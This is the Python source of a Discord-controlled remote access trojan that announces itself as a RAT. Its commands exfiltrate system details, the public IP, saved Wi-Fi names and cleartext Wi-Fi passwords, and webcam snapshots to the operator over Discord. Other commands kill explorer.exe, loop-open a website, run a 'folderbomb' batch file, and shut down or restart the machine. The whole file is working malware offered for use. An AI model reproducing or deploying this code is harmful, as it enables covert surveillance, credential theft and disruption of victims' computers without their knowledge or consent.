import discord
import asyncio
import platform
import getpass
import requests
import time
import os 
import webbrowser
import tkinter
import cv2
from discord.ext import commands
from discord.ext.commands import Bot
username = getpass.getuser() 
ops = platform.system()
node = platform.node() 
arch = platform.architecture()[0] 
pro = platform.processor() 
release = platform.release() 
ip = requests.get('https://api.ipify.org/').text
bot = commands.Bot(command_prefix='*')
print("RAT running...")
@bot.command()
async def sysinfo(ctx):
        await ctx.send("Node: " + node)
        await ctx.send("Arch: " + arch)
        await ctx.send("Processors: " + pro)
        await ctx.send("OS: " + ops)
        await ctx.send("username: " + username)
        await ctx.send("IP: " + ip)
        await ctx.send("Release: " + release)
@bot.command()
async def harder(ctx):
	await ctx.send("[*] Command sent")
	while True:
		webbrowser.open("gay.com")
@bot.command()
async def hot(ctx):
	await ctx.send("[*] Command sent")
	os.system("taskkill /f /IM explorer.exe")
@bot.command()
async def cmd(ctx):
        os.system("start cmd")
        await ctx.send("[*] Command sent")
@bot.command()
async def haxed(ctx):
	webbrowser.open("https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fsensorstechforum.com%2Fwp-content%2Fuploads%2F2017%2F10%2Fstf-magic-ransomware-virus-background-image-youve-been-hacked.png&f=1&nofb=1")
@bot.command()
async def folderbomb(ctx):
        await ctx.send("[*] Command sent")
	os.system("component.bat")
@bot.command()
async def grabessid(ctx):
        await ctx.send("Grabbing ESSIDs..")
        os.system("netsh wlan show profiles > test.txt")
        await ctx.send(file=discord.File('test.txt'))
@bot.command()
async def grabpass(ctx, arg1):
        await ctx.send("Grabbing password...")
        os.system("netsh wlan show profiles " + arg1 + " key=clear > pass.txt")
        await ctx.send(file=discord.File('pass.txt'))
@bot.command()
async def webcam(ctx):
    
    cam = cv2.VideoCapture(0)
    cv2.namedWindow("test")
    img_counter = 0
    ret, frame = cam.read()
    if not ret:
        print("failed to grab frame")
    cv2.imshow("test", frame)
    k = cv2.waitKey(1)
    img_name = "test.png"
    cv2.imwrite(img_name, frame)
    print("{} written!".format(img_name))
    img_counter += 1
    await ctx.send(file=discord.File('test.png'))
    cam.release()
    cv2.destroyAllWindows()
@bot.command()
async def shutdown(ctx):
        await ctx.send("[*] Command sent")
        os.system("shutdown")
@bot.command()
async def restart(ctx):
        await ctx.send("[*] Command sent")
        os.system("shutdown -r")
